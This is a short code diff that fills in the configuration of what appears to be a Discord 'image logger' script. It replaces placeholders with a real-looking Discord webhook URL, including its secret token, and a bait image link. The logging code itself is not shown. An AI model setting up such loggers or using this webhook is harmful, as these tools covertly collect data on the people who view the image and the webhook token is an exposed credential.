@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://canary.discord.com/api/webhooks/1488910044228747274/1EVwh-6k_LU_eqkYcw1aW-xqQQWhOoGlbKgwVHoP_6rhS0zG-nXYIEqqtt1KoMrHutcZ",
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRmCqqtZ01wPSAyJ-2Et_nC85ay3ByHY3faFQ&s", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
